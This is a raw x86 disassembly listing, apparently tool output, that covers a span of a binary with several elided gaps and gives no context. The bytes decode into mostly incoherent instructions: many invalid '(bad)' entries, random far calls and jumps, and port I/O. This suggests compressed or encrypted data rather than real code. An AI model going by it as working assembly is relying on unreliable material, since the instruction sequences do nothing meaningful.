  429125:	scas   eax,DWORD PTR es:[edi]
  429126:	pushw  cs
  429128:	pop    eax
  429129:	mov    ?,WORD PTR [ebx-0x11910059]
  42912f:	xchg   ebx,eax
  429130:	pop    es
  429131:	and    ah,BYTE PTR [ecx+0x6e3c]
	...
  429193:	add    BYTE PTR [eax],al
  429195:	add    BYTE PTR [esi-0x79],dl
  429198:	std    
  429199:	test   ch,bh
  42919b:	(bad)  
  42919c:	jg     0x429175
  42919e:	xor    dh,0xd6
  4291a1:	stos   DWORD PTR es:[edi],eax
  4291a2:	add    eax,0x1b5bd046
  4291a7:	mov    bh,0x1
  4291a9:	add    BYTE PTR [edi],al
  4291ab:	add    DWORD PTR [eax],eax
  4291ad:	add    BYTE PTR [edx*2+0x7267a32d],bh
  4291b4:	out    0x81,eax
  4291b6:	inc    edi
  4291b7:	mov    eax,edi
  4291b9:	xor    edx,DWORD PTR [ebp+ebp*2+0xc]
  4291bd:	fild   QWORD PTR [eax]
  4291bf:	popf   
  4291c0:	inc    esi
  4291c1:	lds    edi,FWORD PTR [eax-0x2d]
  4291c4:	gs pop esp
  4291c6:	aaa    
  4291c7:	add    eax,0x6c853b4e
  4291cc:	sbb    eax,0x8826e931
  4291d1:	dec    ecx
  4291d2:	ss push 0x6b
  4291d5:	es push 0x1
  4291d8:	popf   
  4291d9:	push   eax
  4291da:	inc    esp
  4291db:	leave  
  4291dc:	ins    DWORD PTR es:[edi],dx
  4291dd:	fbstp  TBYTE PTR [ebp+0x2f]
  4291e0:	call   0x73bc:0x8adc1d98
  4291e7:	xor    eax,0xa302d6bd
  4291ec:	sub    DWORD PTR [eax-0x5d61e6a2],esp
  4291f2:	cmp    edx,edi
  4291f4:	push   eax
  4291f5:	(bad)  
  4291f6:	(bad)  
  4291f7:	push   ecx
  4291f8:	cdq    
  4291f9:	inc    ecx
  4291fa:	popf   
  4291fb:	jmp    0x3deef76b
  429200:	mov    esi,0x4714cfbf
  429205:	out    dx,al
  429206:	retf   
  429207:	xor    al,0x9
  429209:	imul   ecx,DWORD PTR ds:0x104191d4,0xffffff90
  429210:	and    dh,ch
  429212:	push   0x16
  429214:	pop    es
  429215:	or     ecx,DWORD PTR [ebx+0x79926bdb]
  42921b:	cs ss sub bl,ch
  42921f:	fdivr  QWORD PTR es:[esi]
  429222:	fs (bad) 
  429224:	fist   WORD PTR [ebp+0x1953eb49]
  42922a:	mov    ?,WORD PTR [edx-0x37]
  42922d:	add    eax,0x54c39eb4
  429232:	push   edx
  429233:	out    dx,eax
  429234:	jmp    0x1934:0x4598b98
  42923b:	jl     0x429297
  42923d:	mov    dh,0x35
  42923f:	adc    ebx,DWORD PTR [ebp-0x5f315fb9]
  429245:	jno    0x429244
  429247:	push   es
  429248:	cs out 0x28,eax
  42924b:	imul   edi,DWORD PTR [esi],0xffffffcc
  42924e:	or     ebx,DWORD PTR [edx+0x76]
  429251:	xor    bh,BYTE PTR [edi-0x7bd7a829]
  429257:	inc    edi
  429258:	call   0xca52:0xe3170e11
  42925f:	mul    bh
  429261:	aam    0x4
  429263:	mov    bl,0x88
  429265:	adc    ebx,edi
  429267:	mov    bh,ah
  429269:	(bad)  
  42926b:	push   cs
  42926c:	in     eax,dx
  42926d:	cmp    BYTE PTR [ecx-0x1],ah
  429270:	cli    
  429271:	(bad)  
  429272:	out    0x44,eax
  429274:	shl    BYTE PTR [esp+eax*4+0x32],1
  429278:	mov    edx,edi
  42927a:	ficom  DWORD PTR [eax]
  42927c:	ss xchg ebp,eax
  42927e:	leave  
  42927f:	bound  edi,QWORD PTR ds:0x6d4e94bc
  429285:	dec    ebp
  429286:	push   0xffffffbb
  429288:	(bad)  
  42928a:	add    al,0xb0
  42928d:	mov    eax,0xb2f06648
  429292:	cmp    eax,0xbe878335
  429297:	(bad)  
  429298:	mov    cl,0x2c
  42929a:	push   ebx
  42929b:	retf   
  42929c:	inc    eax
  42929d:	cmp    edi,DWORD PTR [eax+0x6c93b6a8]
  4292a3:	loopne 0x42927e
  4292a5:	bound  ebx,QWORD PTR [eax-0x34]
  4292a8:	add    eax,0xf5a736c2
  4292ad:	enter  0xc4e,0xd4
  4292b1:	das    
  4292b2:	sbb    al,0x33
  4292b4:	out    0x0,al
	...
  429316:	lock adc al,0xe1
  429319:	(bad)  
  42931a:	in     eax,0xff
  42931c:	call   FWORD PTR [esi]
  42931e:	xor    cl,BYTE PTR [ebx-0xc]
  429321:	fs (bad) 
  429323:	fild   DWORD PTR ds:0x1b82292
  429329:	add    BYTE PTR [edi],al
  42932b:	add    DWORD PTR [eax],eax
  42932d:	add    BYTE PTR [esi],dh
  42932f:	push   ds
  429330:	mov    dl,0x38
  429332:	mov    bl,0x7a
  429334:	sub    al,0x4e
  429336:	adc    al,bl
  429338:	bound  edi,QWORD PTR [eax-0x5494a753]
  42933e:	mov    ebx,0xf5864c93
  429343:	(bad)  
  429344:	fimul  DWORD PTR [edi+0x12]
  429347:	pusha  
  429348:	imul   esp,DWORD PTR [edi-0x1c91a569],0x10
  42934f:	mov    ds:0xc09051e5,eax
  429354:	mov    ebx,0xcb6f19c
  429359:	push   ecx
  42935a:	(bad)  
  42935b:	mov    ?,ebx
  42935d:	ret    0xca39
  429360:	mov    ebp,0xdb15f19b
  429365:	and    ecx,edx
  429367:	adc    eax,0x902df914
  42936c:	stos   DWORD PTR es:[edi],eax
  42936d:	punpckhwd mm1,QWORD PTR [esi+0x5db54fb8]
  429374:	int3   
  429375:	add    BYTE PTR [ebx+0x6b],0x5f
  429379:	cmp    al,0x4e
  42937b:	popa   
  42937c:	jb     0x42934c
  42937e:	push   0x11
  429380:	(bad)  
  429381:	in     al,dx
  429382:	sbb    ch,bl
  429384:	jns    0x429325
  429386:	mov    cl,0xc2
  429388:	ja     0x429325
  42938a:	mov    ebp,0xf5c38d78
  42938f:	push   cs
  429390:	outs   dx,DWORD PTR ds:[esi]
  429391:	(bad)  
  429392:	test   eax,0x511985e5
  429397:	cmp    BYTE PTR [eax],dl
  429399:	adc    eax,0x1eca32c4
  42939e:	adc    esi,DWORD PTR [ebx]
  4293a0:	dec    ecx
  4293a1:	xchg   edi,eax
  4293a2:	xchg   edi,eax
  4293a3:	inc    eax
  4293a4:	mov    dh,0xc2
  4293a6:	or     eax,DWORD PTR [edx-0x71]
  4293a9:	jmp    0x7e85ae92
  4293ae:	xchg   ebx,eax
  4293af:	or     al,0x8d
  4293b1:	push   es
  4293b2:	jo     0x429380
  4293b4:	adc    edx,ebp
  4293b6:	ret    0x9c8a
  4293b9:	std    
  4293ba:	cmp    BYTE PTR [edi-0x10],0x80
  4293be:	fdivr  DWORD PTR [ebx-0x63]
  4293c1:	adc    eax,0xaaa9a9c9
  4293c6:	dec    BYTE PTR [esp+ebp*1+0x5b]
  4293ca:	mov    ah,0xdf
  4293cc:	es loopne 0x42935a
  4293cf:	dec    edi
  4293d0:	int3   
  4293d1:	test   eax,0xd1b70dc0
  4293d6:	test   DWORD PTR [edi+0xd],0xa5f0c021
  4293dd:	pop    edx
  4293de:	fistp  WORD PTR [esi+0x74]
  4293e1:	add    al,0xf2
  4293e3:	stc    
  4293e4:	shl    eax,cl
  4293e6:	jmp    0x4293f3
  4293e8:	inc    ecx
  4293e9:	jns    0x429388
  4293eb:	retf   0x2dae
  4293ee:	aad    0x57
  4293f0:	fbstp  TBYTE PTR [eax+0x6ba4af9c]
  4293f6:	jl     0x4293b3
  4293f8:	out    0x87,al
  4293fa:	dec    edi
  4293fb:	or     BYTE PTR [edx],cl
  4293fd:	cmp    al,0xb1
  4293ff:	xchg   ebp,ebx
  429401:	pmulhuw mm4,QWORD PTR [ecx+0x58]
  429405:	cmp    edi,DWORD PTR [edx+edi*2]
  429408:	dec    esi
  429409:	ds jg  0x42942b
  42940c:	jg     0x4293ee
  42940e:	jnp    0x4293f6
  429410:	shl    BYTE PTR [esp+eax*2],1
  429413:	ret    0x1474
  429416:	test   al,0x47
  429418:	jge    0x42947b
  42941a:	cmp    DWORD PTR [edx],esi
  42941c:	pop    ds
  42941d:	jecxz  0x42942e
  42941f:	add    al,0xde
  429421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429422:	push   ebp
  429423:	(bad)  
  429424:	xor    WORD PTR [ebx],di
  429427:	jbe    0x42944e
  429429:	mov    al,ds:0x29fa1f04
  42942e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42942f:	leave  
  429430:	sub    eax,0xcc767560
	...
  429495:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  429499:	sub    al,0x53
  42949b:	ds jg  0x42950b
  42949e:	adc    al,0xa9
  4294a0:	outs   dx,DWORD PTR ds:[esi]
  4294a1:	xlat   BYTE PTR ds:[ebx]
  4294a2:	(bad)  
  4294a4:	sub    al,0xe9
  4294a6:	sub    DWORD PTR [ecx+0x1070001],edi
  4294ac:	add    BYTE PTR [eax],al
  4294ae:	(bad)  
  4294af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4294b0:	add    BYTE PTR [edx],ah
  4294b2:	cmp    bl,al
  4294b4:	pop    ebp
  4294b5:	not    ebp
  4294b7:	ins    DWORD PTR es:[edi],dx
  4294b8:	jmp    0x3635:0xecb555c2
  4294bf:	push   0xf9b5234b
  4294c4:	pushf  
  4294c5:	sub    ecx,DWORD PTR [esi]
  4294c7:	ds mov bl,0x80
  4294ca:	shr    BYTE PTR [ebp+0x316e85c3],1
  4294d0:	js     0x429519
  4294d2:	pop    eax
  4294d3:	into   
  4294d4:	add    edx,edx
  4294d6:	(bad)  
  4294d8:	jmp    0x1a8c:0x8e7e8b6c
  4294df:	add    al,al
  4294e1:	push   eax
  4294e2:	nop
  4294e3:	jg     0x4294fc
  4294e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4294e6:	aas    
  4294e7:	scas   eax,DWORD PTR es:[edi]
  4294e8:	and    ah,BYTE PTR [ebp+0x48]
  4294eb:	pop    es
  4294ec:	out    0x2,al
  4294ee:	jne    0x429510
  4294f0:	sbb    ch,al
  4294f2:	push   ebx
  4294f3:	test   DWORD PTR [ecx+esi*1-0x1e],esi
  4294f7:	sub    BYTE PTR [esi+0x3e7c6daf],bh
  4294fd:	ins    BYTE PTR es:[edi],dx
  4294fe:	shl    DWORD PTR ds:0x5acd2a0b,cl
  429504:	hlt    
  429505:	pop    edi
  429506:	or     edi,ebp
  429508:	lds    edx,FWORD PTR [esi+0x13]
  42950b:	sub    al,0x9f
  42950d:	shl    esp,1
  42950f:	sub    dh,BYTE PTR [eax]
  429511:	shr    DWORD PTR [edi+0x6c7b2aa2],1
  429517:	xchg   edx,eax
  429518:	mov    edi,DWORD PTR [ecx+0x79e88d9]
  42951e:	jg     0x4294e2
  429520:	dec    esi
  429521:	sbb    eax,0xfdd8762d
  429526:	outs   dx,BYTE PTR ds:[esi]
  429527:	stc    
  429528:	test   eax,0x537c74a2
  42952d:	lods   al,BYTE PTR ds:[esi]
  42952e:	sahf   
  42952f:	cmp    eax,0xe954aa12
  429534:	or     eax,0xd7ee5ebe
  429539:	xchg   edi,eax
  42953a:	push   cs
  42953b:	mov    DWORD PTR [edi+0x31],ebp
  42953e:	ds hlt 
  429540:	xchg   esi,eax
  429541:	jns    0x429530
  429543:	les    eax,FWORD PTR [eax-0x3a]
  429546:	clc    
  429547:	enter  0xfd2b,0x6a
  42954b:	cmp    BYTE PTR [esi+0x66cfceeb],dl
  429551:	scas   al,BYTE PTR es:[edi]
  429552:	pop    eax
  429553:	frstor [ebx]
  429555:	into   
  429556:	adc    ch,BYTE PTR [eax]
  429558:	daa    
  429559:	adc    DWORD PTR [ecx-0x175f5d9],ebp
  42955f:	sub    al,0xc5
  429561:	icebp  
  429562:	sbb    dl,cl
  429564:	clc    
  429565:	add    al,0x2c
  429567:	fistp  QWORD PTR [esi+esi*2-0x2b93f28f]
  42956e:	repnz pop edi
  429570:	(bad)  
  429571:	cs ret 
  429573:	(bad)  
  429574:	cmp    ah,BYTE PTR [edi+ebx*8]
  429577:	call   DWORD PTR [esi+eax*8]
  42957a:	test   al,0x91
  42957c:	loopne 0x429557
  42957e:	sti    
  42957f:	sub    ah,BYTE PTR ds:[eax+0x412f7369]
  429586:	cs cs xchg al,dl
  42958a:	test   BYTE PTR [ecx-0x677b27a0],cl
  429590:	jg     0x4295ed
  429592:	mov    edx,0xd48862a
  429597:	addr16 iret 
  429599:	test   al,0x17
  42959b:	jge    0x429587
  42959d:	mov    ch,0x1f
  42959f:	jno    0x429567
  4295a1:	call   0x3b78:0xd1dc3a8d
  4295a8:	jmp    0xfb4f7865
  4295ad:	in     eax,0xe0
  4295af:	out    dx,eax
  4295b0:	dec    ebp
  4295b1:	push   ecx
  4295b2:	mov    esi,0x603b
	...
  429613:	add    BYTE PTR [eax],al
  429615:	add    BYTE PTR [ebp+0x1d],ch
  429618:	out    0xc0,al
  42961a:	idiv   bl
  42961c:	outs   dx,DWORD PTR ds:[esi]
  42961d:	mov    ebp,0x8523ba9d
  429622:	cmp    bh,bl
  429624:	daa    
  429625:	outs   dx,DWORD PTR ds:[esi]
  429626:	xor    BYTE PTR [edx+0x1070001],bh
  42962c:	add    BYTE PTR [eax],al
  42962e:	add    al,0x80
  429630:	mov    ch,0x67
  429632:	scas   al,BYTE PTR es:[edi]
  429633:	jmp    0x4295bb
  429635:	loope  0x4295c7
  429637:	cmp    DWORD PTR [edi+ecx*8+0x1f9533a7],esp
  42963e:	lods   al,BYTE PTR ds:[esi]
  42963f:	cli    
  429640:	jmp    0x4295d0
  429642:	sti    
  429643:	lahf   
  429644:	xchg   esi,eax
  429645:	fdivrp st(6),st
  429647:	mov    esp,0x3e0bb4f8
  42964c:	and    BYTE PTR [ecx],bl
  42964e:	jl     0x429696
  429650:	inc    esp
  429651:	mov    bh,ch
  429653:	fldenv [ecx+ebx*4]
  429656:	scas   al,BYTE PTR es:[edi]
  429657:	jle    0x42961e
  429659:	(bad)  
  42965a:	out    dx,al
  42965b:	cmp    dl,BYTE PTR [ecx]
  42965d:	ins    DWORD PTR es:[edi],dx
  42965e:	int    0xe4
  429660:	(bad)  
  429663:	dec    ebx
  429665:	fisubr WORD PTR ds:0x10a5fd6f
  42966b:	sub    al,0x1f
  42966d:	pop    ebp
  42966e:	pop    eax
  42966f:	mov    dh,0x1e
  429671:	xor    eax,0xef7c0eea
  429676:	adc    BYTE PTR [ebx],0x74
  429679:	sub    DWORD PTR ss:[ebx-0x6beea52d],ecx
  429680:	dec    eax
  429681:	mov    edx,0x8bdc9418
  429686:	add    DWORD PTR [ebp+0x41],edi
  429689:	sahf   
  42968a:	mov    cl,0x2
  42968c:	je     0x4296ab
  42968e:	adc    DWORD PTR [ecx],ebp
  429690:	repz imul ebx,DWORD PTR [edx+ebx*4],0x31dc56a4
  429698:	je     0x4296cb
  42969a:	adc    ah,BYTE PTR [edi]
  42969c:	jbe    0x4296ba
  42969e:	sahf   
  42969f:	and    al,BYTE PTR [edi+0x58]
  4296a2:	call   0xdb00:0x7c60fbdd
  4296a9:	pusha  
  4296aa:	mov    ah,0x13
  4296ac:	leave  
  4296ad:	jle    0x4296a4
  4296af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4296b0:	xor    BYTE PTR [esi],0x29
  4296b3:	scas   eax,DWORD PTR es:[edi]
  4296b4:	cmp    al,0x23
  4296b6:	sbb    BYTE PTR [esi],0x57
  4296b9:	loop   0x42970f
  4296bb:	(bad)  
  4296bc:	mov    edx,0x10d82486
  4296c1:	shr    BYTE PTR [ecx],0x25
  4296c4:	and    al,BYTE PTR [ecx]
  4296c6:	mov    esp,0x6f7182d2
  4296cb:	cwde   
  4296cc:	xor    BYTE PTR [ebx],0x6
  4296cf:	pop    ebp
  4296d0:	or     DWORD PTR [edi],esi
  4296d2:	push   0x6f8306e9
  4296d7:	rcr    DWORD PTR [esi-0x1c],cl
  4296da:	iret   
  4296db:	jmp    DWORD PTR [ebp+0x76]
  4296de:	sub    BYTE PTR [ecx+ecx*4+0x4e],bl
  4296e2:	pop    es
  4296e3:	(bad)  
  4296e5:	xor    cl,BYTE PTR [eax]
  4296e7:	pop    esi
  4296e8:	mov    bh,BYTE PTR [edi-0x1264520b]
  4296ee:	and    al,0xf
  4296f0:	adc    al,0x84
  4296f2:	push   esp
  4296f3:	mov    dl,0x1d
  4296f5:	enter  0x13c1,0xc6
  4296f9:	sub    al,0xa2
  4296fb:	mov    al,0x36
  4296fd:	mov    ch,BYTE PTR [esi+eiz*4+0x42]
  429701:	jmp    0x42970c
  429703:	mov    DWORD PTR [esi+ecx*8],esp
  429706:	(bad)  
  429708:	pop    ecx
  429709:	out    dx,eax
  42970a:	adc    DWORD PTR gs:[eax+ebp*8-0x18],edx
  42970f:	or     al,0x6d
  429711:	int3   
  429712:	retf   0x1655
  429715:	and    al,BYTE PTR [ecx+0x4eb73265]
  42971b:	add    eax,0xfb794127
  429720:	fcomp  QWORD PTR [edx+0xd470782]
  429726:	js     0x4296e8
  429728:	xchg   esi,eax
  429729:	jmp    0xb168:0x8f23e5af
  429730:	lock in al,0xf2
  429733:	ja     0x4297b1
	...
  429795:	add    BYTE PTR [eax],dh
  429797:	inc    edx
  429798:	fbld   TBYTE PTR [edx-0x1]
  42979b:	(bad)  
  42979c:	mov    ebp,0x1396252
  4297a1:	verw   WORD PTR [edx+0x74]
  4297a5:	outs   dx,DWORD PTR ds:[esi]
  4297a6:	aaa    
  4297a7:	mov    ebx,0x1070001
  4297ac:	add    BYTE PTR [eax],al
  4297ae:	jp     0x42977f
  4297b0:	out    0xbc,al
  4297b2:	das    
  4297b3:	lods   eax,DWORD PTR ds:[esi]
  4297b4:	push   ecx
  4297b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4297b6:	arpl   WORD PTR [esi*1+0x67647571],bx
  4297bd:	cmp    al,0xfb
  4297bf:	xlat   BYTE PTR ds:[ebx]
  4297c0:	lods   eax,DWORD PTR ds:[esi]
  4297c1:	mov    esp,0x88a166a7
  4297c6:	out    dx,al
  4297c7:	test   al,0x36
  4297ca:	xchg   esi,eax
  4297cb:	(bad)  
  4297cc:	aaa    
  4297cd:	scas   eax,DWORD PTR es:[edi]
  4297ce:	ret    
  4297cf:	push   cs
  4297d0:	sbb    DWORD PTR [ebp-0x1e],eax
  4297d3:	mov    bl,0xbf
  4297d5:	adc    edx,edx
  4297d7:	mov    dh,0x70
  4297d9:	push   esp
  4297da:	mov    edi,DWORD PTR [ebx]
  4297dc:	mov    ?,WORD PTR [edx+0x31]
  4297df:	es loop 0x429816
  4297e2:	inc    esi
  4297e3:	jg     0x4297d5
  4297e5:	cld    
  4297e6:	ins    DWORD PTR es:[edi],dx
  4297e7:	pop    es
  4297e8:	or     ebp,eax
  4297ea:	xchg   esi,eax
  4297eb:	out    0x8f,eax
  4297ed:	jnp    0x429856
  4297ef:	repnz push edx
  4297f1:	sub    esp,DWORD PTR [edx+0x63]
  4297f4:	xor    al,0xc1
  4297f6:	out    0x51,al
  4297f8:	(bad)  
  4297f9:	or     DWORD PTR gs:0xcdec4929,ecx
  429800:	arpl   si,dx
  429802:	jmp    0x4297c2
  429804:	(bad)  
  429805:	into   
  429806:	jns    0x42984c
  429808:	push   cs
  429809:	lods   eax,DWORD PTR ds:[esi]
  42980a:	mov    esp,0xfd3e370a
  42980f:	imul   edi,DWORD PTR [ecx-0x414e8da6],0x89d0ec43
  429819:	mov    ds:0x118201f8,al
  42981e:	cld    
  42981f:	jns    0x4297e6
  429821:	lds    ebx,FWORD PTR [ebx-0x71]
  429824:	(bad)  
  429825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429826:	das    
  429827:	lahf   
  429828:	xchg   edx,eax
  429829:	xchg   edx,edx
  42982b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42982c:	int3   
  42982d:	xor    BYTE PTR [edi],ah
  42982f:	call   0xf2bf:0x788cb81
  429836:	das    
  429837:	adc    al,0x55
  429839:	and    DWORD PTR [ecx-0x34],esp
  42983c:	call   FWORD PTR [edx]
  42983e:	pop    edx
  42983f:	adc    DWORD PTR [esi],eax
  429841:	rcr    edx,1
  429843:	inc    ebx
  429844:	lods   al,BYTE PTR ds:[esi]
  429845:	mov    ecx,gs
  429847:	retf   
  429848:	jge    0x42981c
  42984a:	mov    ch,0x57
  42984c:	adc    eax,0x778aca3
  429851:	fdivrp st(0),st
  429853:	outs   dx,DWORD PTR ds:[esi]
  429854:	fwait
  429855:	sbb    BYTE PTR [eax-0x284b51cc],0x26
  42985c:	clc    
  42985d:	call   0xd54fbbb9
  429862:	fbstp  TBYTE PTR [edi+esi*2-0x36a8e0c6]
  429869:	mov    edi,0xa2fab543
  42986e:	inc    esp
  42986f:	mov    al,ds:0xa40b0fe
  429874:	mov    bh,0x94
  429876:	jecxz  0x4298a8
  429878:	push   0xffffffdd
  42987a:	mov    BYTE PTR [edx+0x43],cl
  42987d:	retf   0x2343
  429880:	jmp    0x4298a6
  429882:	enter  0x2fd8,0xe
  429886:	push   ebp
  429887:	out    dx,al
  429888:	in     al,0x76
  42988a:	in     eax,dx
  42988b:	jnp    0x4298ae
  42988d:	push   esp
  42988e:	add    DWORD PTR [ecx],ecx
  429890:	mov    eax,ds:0xfbb7f912
  429895:	sbb    ah,bl
  429897:	push   es
  429898:	in     al,0x15
  42989a:	xor    al,0x46
  42989c:	shl    ebx,0xc0
  42989f:	add    BYTE PTR [edx-0x3e36b143],dh
  4298a5:	div    DWORD PTR cs:[edi]
  4298a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298a9:	(bad)  
  4298aa:	and    eax,0x22c49e8f
  4298af:	and    BYTE PTR [esi+edi*2+0x465aa2],bl
	...
  429916:	push   edi
  429917:	push   0xdf7fdf64
  42991c:	(bad)  
  42991d:	call   0x449747d3
  429922:	pop    ss
  429923:	jne    0x42993d
  429925:	lahf   
  429926:	ds mov esp,0x1070001
  42992c:	add    BYTE PTR [eax],al
  42992e:	and    eax,0x4b175f0
  429933:	xor    eax,0x1619e475
  429938:	stc    
  429939:	push   ds
  42993a:	cmp    ebp,DWORD PTR [edi-0x171e03b8]
  429940:	pop    ss
  429941:	mov    ch,BYTE PTR [ebx]
  429943:	pusha  
  429944:	rol    esi,0x87
  429947:	cs stc 
  429949:	and    BYTE PTR [edi],0x3f
  42994c:	shl    BYTE PTR [esp+edi*1+0x5638ae59],1
  429953:	pop    edx
  429954:	int    0x6c
  429956:	add    bh,BYTE PTR [ebp-0x2c]
  429959:	push   0x5a758bb1
  42995e:	sbb    edx,DWORD PTR [ebp+0x38]
  429961:	inc    edx
  429962:	ror    cl,1
  429964:	lods   eax,DWORD PTR ds:[esi]
  429965:	cdq    
  429966:	stos   BYTE PTR es:[edi],al
  429967:	outs   dx,DWORD PTR ds:[esi]
  429968:	out    dx,al
  429969:	arpl   cx,bp
  42996b:	jecxz  0x429913
  42996d:	in     eax,0x6a
  42996f:	test   al,0xd3
  429971:	out    dx,al
  429972:	mov    bh,0xf0
  429974:	pop    ecx
  429975:	mov    ds:0x2de81fbe,eax
  42997a:	add    al,BYTE PTR [esi+0x1198b385]
  429980:	pop    ss
  429981:	imul   edi,DWORD PTR [eax],0x91e0a791
  429987:	shl    BYTE PTR [eax+0x24c21c55],0x95
  42998e:	or     DWORD PTR [edx+0x71],ecx
  429991:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429992:	add    esp,DWORD PTR [edi+0x1a]
  429995:	sahf   
  429996:	aam    0x58
  429998:	test   DWORD PTR ds:0xf55bde50,eax
  42999e:	jbe    0x42995a
  4299a0:	and    al,ch
  4299a2:	aam    0xca
  4299a4:	leave  
  4299a5:	into   
  4299a6:	jl     0x4299c7
  4299a8:	mov    cl,0xfe
  4299aa:	and    eax,DWORD PTR [eax+0x6cc2851c]
  4299b0:	mov    WORD PTR [ebx+edi*2+0x59],?
  4299b4:	int    0xdc
  4299b6:	(bad)  
  4299b7:	js     0x4299a9
  4299b9:	sbb    eax,edx
  4299bb:	dec    esi
  4299bc:	jns    0x429976
  4299be:	xchg   edx,eax
  4299bf:	add    BYTE PTR [eax+0x7ba84d80],dh
  4299c5:	add    al,0x68
  4299c8:	cmp    bh,BYTE PTR ds:0x7c0030a4
  4299ce:	jns    0x429a0b
  4299d0:	in     eax,0xe6
  4299d2:	arpl   WORD PTR [ebp+0x58],ax
  4299d5:	mov    bh,0xd1
  4299d7:	mov    esp,0x3def35a3
  4299dc:	rcl    BYTE PTR [esi+0x66d2bff9],cl
  4299e2:	ds jl  0x4299c8
  4299e5:	or     ebx,DWORD PTR [edi]
  4299e7:	sbb    esp,DWORD PTR [ecx-0x3d3c1d3]
  4299ed:	cmp    DWORD PTR [edx+0x3d],esi
  4299f0:	icebp  
  4299f1:	std    
  4299f2:	jp     0x42999f
  4299f4:	jmp    0xab943c66
  4299f9:	shl    al,1
  4299fb:	sub    al,0x2
  4299fd:	jmp    0x429a3d
  4299ff:	cmp    dh,ah
  429a01:	jmp    0xd09afc46
  429a06:	sbb    bl,BYTE PTR [ebx+0x60f822f0]
  429a0c:	mov    BYTE PTR ds:0xd546d022,ch
  429a12:	mov    bh,0x30
  429a14:	jae    0x429a90
  429a16:	and    eax,0x947588a5
  429a1b:	xor    al,0xa4
  429a1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429a1e:	out    0x7d,al
  429a20:	mov    esp,0x2be66f5e
  429a25:	shl    DWORD PTR [ecx],1
  429a27:	ja     0x429a07
  429a29:	(bad)  
  429a2a:	sti    
  429a2b:	jl     0x4299f9
  429a2d:	mov    es,WORD PTR [ebx]
  429a2f:	ins    DWORD PTR es:[edi],dx
  429a30:	jae    0x429ab0
  429a32:	test   eax,0x9c6a
	...
  429a93:	add    BYTE PTR [eax],al
  429a95:	add    dh,cl
  429a97:	std    
  429a98:	sti    
  429a99:	leave  
  429a9a:	sti    
  429a9b:	iret   
  429a9c:	(bad)  
  429a9d:	jmp    DWORD PTR [ecx]
  429a9f:	dec    eax
  429aa0:	mov    edi,0xf3397313
  429aa5:	into   
  429aa6:	inc    ebp
  429aa7:	mov    ebp,0x1070001
  429aac:	add    BYTE PTR [eax],al
  429aae:	ficom  DWORD PTR [ebx+edx*8+0x3d1f6298]
  429ab5:	jl     0x429aff
  429ab7:	jmp    0x429a5e
  429ab9:	sbb    al,0xcc
  429abb:	rcl    dl,cl
  429abd:	jne    0x429ab4
  429abf:	cwde   
  429ac0:	mov    ch,cl
  429ac2:	test   BYTE PTR [ebx+0x6dfcab01],ah
  429ac8:	sbb    eax,0x84c529df
  429acd:	sar    dh,0x39
  429ad0:	sti    
  429ad1:	imul   edx,DWORD PTR [ecx-0x34965589],0xa34f2f01
  429adb:	pop    esp
  429adc:	dec    eax
  429add:	xor    DWORD PTR [ebx],edx
  429adf:	icebp  
  429ae0:	sbb    DWORD PTR [ebx],esp
  429ae2:	data16 fsubr QWORD PTR [esi+0xa]
  429ae6:	out    dx,al
  429ae7:	add    BYTE PTR [ebx+esi*1+0x15faedc5],bl
  429aee:	fdiv   st,st(3)
  429af0:	push   edx
  429af1:	in     al,dx
  429af2:	imul   eax,DWORD PTR [ebp+0x74],0x4e
  429af6:	popf   
  429af7:	push   ebp
  429af8:	cli    
  429af9:	cmp    BYTE PTR [edi-0x2e],ah
  429afc:	mov    cs,eax
  429afe:	and    esi,DWORD PTR [ebp-0x3b978130]
  429b04:	adc    DWORD PTR [esi],ecx
  429b06:	les    esp,FWORD PTR ss:[ecx-0x1fbf80f2]
  429b0d:	adc    bh,BYTE PTR [ecx+0x3facfdd0]
  429b13:	imul   edx,DWORD PTR [edx],0xffffffa5
  429b16:	pop    ss
  429b17:	mov    eax,ds:0xe0c6f6d7
  429b1c:	mov    ch,0x1e
  429b1e:	lock not DWORD PTR [esi-0x4c]
  429b22:	sub    eax,0x9ce1c8c0
  429b27:	jne    0x429b70
  429b29:	out    0x83,eax
  429b2b:	push   es
  429b2c:	fs rcr dl,1
  429b2f:	dec    ebx
  429b30:	cmp    eax,0xf492a30d
  429b35:	fist   WORD PTR [ebx-0x14]
  429b38:	sahf   
  429b39:	dec    edi
  429b3a:	jno    0x429b67
  429b3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b3d:	scas   al,BYTE PTR es:[edi]
  429b3e:	cs out 0xa8,eax
  429b41:	(bad)  
  429b42:	sub    edi,DWORD PTR [ebx+0x38f3adc8]
  429b48:	lds    ebx,FWORD PTR [edi-0x704d098d]
  429b4e:	dec    esp
  429b4f:	add    esp,DWORD PTR [edx+0x5b]
  429b52:	mov    esi,0x45f0e836
  429b57:	(bad)  [edi-0x3a50087a]
  429b5d:	push   ecx
  429b5e:	jg     0x429b44
  429b60:	faddp  st(7),st
  429b62:	daa    
  429b63:	pop    esi
  429b64:	cmp    BYTE PTR [ecx],bl
  429b66:	push   0x11b3e7fa
  429b6b:	mov    ecx,0x668a189b
  429b70:	pop    edi
  429b71:	dec    edi
  429b72:	shr    BYTE PTR [edx-0x64],cl
  429b75:	aam    0xb0
  429b77:	cs stos BYTE PTR es:[edi],al
  429b79:	jns    0x429b23
  429b7b:	push   ebp
  429b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b7d:	adc    eax,0x32e9fa57
  429b82:	test   DWORD PTR [ecx-0x4be014b],ebp
  429b88:	call   0x55ce3cd1
  429b8d:	xchg   DWORD PTR [ebx+ecx*8+0x67],esp
  429b91:	repz idiv DWORD PTR [edi+ebx*1-0xf]
  429b96:	sub    DWORD PTR [eax-0x2b],edi
  429b99:	aad    0x62
  429b9b:	inc    esi
  429b9c:	jecxz  0x429b52
  429b9e:	aaa    
